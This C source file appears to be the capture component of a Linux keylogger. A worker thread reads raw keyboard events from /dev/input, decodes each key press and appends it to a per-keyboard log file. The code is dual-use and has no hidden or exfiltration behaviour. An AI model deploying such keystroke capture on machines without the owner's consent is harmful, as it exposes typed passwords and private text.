/* kb_reader.c */
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <string.h>

#include <kb_worker.h>
#include <kb_mapper.h>
#include <kb_decoder.h>
#include <logs/logger.h>
#include <constants/constants.h>
#include <file/file_handler.h>
#include <mem.h>

#define FAILED_TO_READ "Failed to read event file"
#define FAILED_TO_OPEN "Failed to open event file"
#define DISCONNECTED   "Disconnected"

#define START_CAPTURE  "Start capturing..."
#define RESETTING      "Resetting..."

struct kb_worker_cleanup_infos {
    struct kb_worker *kb_worker;
    int    device_file_fd;
};

static void killed_worker(void *arg)
{
    // Cleanup handler.
    struct kb_worker_cleanup_infos *cleanup_infos = (struct kb_worker_cleanup_infos *) arg;
    // Close the open device files.
    if (cleanup_infos->device_file_fd != -1) close(cleanup_infos->device_file_fd);
    // Set worker state.
    if (cleanup_infos->kb_worker->kb_status != KB_WORKER_FAILED)
    {
        cleanup_infos->kb_worker->kb_status = KB_WORKER_RESET;
        make_terminal_log(RESETTING, cleanup_infos->kb_worker->kb_id);
        return;
    }
    make_terminal_log(DISCONNECTED, cleanup_infos->kb_worker->kb_id);
}

__attribute__((noreturn)) void *start_worker(void *worker)
{
    struct kb_worker_cleanup_infos cleanup_infos;
    struct kb_worker *worker_infos = (struct kb_worker *) worker;
    struct input_event device_event; // Current keyboard device event.
    struct kb_dec_key *decoded;
    char *device_event_path;

    ALLOC_MEM(device_event_path, strlen(worker_infos->kb_event_file) + 1, sizeof(char));
    pthread_cleanup_push(killed_worker, (void *) &cleanup_infos);
    strcpy(device_event_path, worker_infos->kb_event_file);

    int device_fd = open(device_event_path, O_RDONLY);
    free(device_event_path);
    if (device_fd == -1)
    {
        make_terminal_log(FAILED_TO_OPEN, worker_infos->kb_id);
        cleanup_infos.kb_worker = worker_infos;
        cleanup_infos.device_file_fd = -1;
        cleanup_infos.kb_worker->kb_status = KB_WORKER_FAILED;
        pthread_exit(0);
    }
    // Save the cleanup data.
    cleanup_infos.kb_worker = worker_infos;
    cleanup_infos.device_file_fd = device_fd;

    make_terminal_log(START_CAPTURE, worker_infos->kb_id);
    while (TRUE) {
        if (read(device_fd, &device_event, sizeof(device_event)) == -1)
        {
            make_terminal_log(FAILED_TO_READ, worker_infos->kb_id);
            worker_infos->kb_status = KB_WORKER_FAILED;
            pthread_exit(0);
        }

        if (worker_infos->kb_status == KB_WORKER_INITIAL) create_log_file(worker_infos->kb_id);
        if (worker_infos->kb_status != KB_WORKER_RUNNING) worker_infos->kb_status = KB_WORKER_RUNNING;

        if (device_event.type == 1 && device_event.value == 1)
        {
            decoded = decode(device_event.code);
            if (decoded == NULL) continue;
            make_keystroke_log(decoded->kb_key_name, worker_infos->kb_id);
            append_to_file(decoded->kb_key_name, worker_infos->kb_id);

            if (decoded->kb_key_code == KEY_ENTER)
            {
                // Save the contents of the buffer.
                append_to_file("\n", worker_infos->kb_id);
            }
        }

    }
    pthread_cleanup_pop(killed_worker);
}
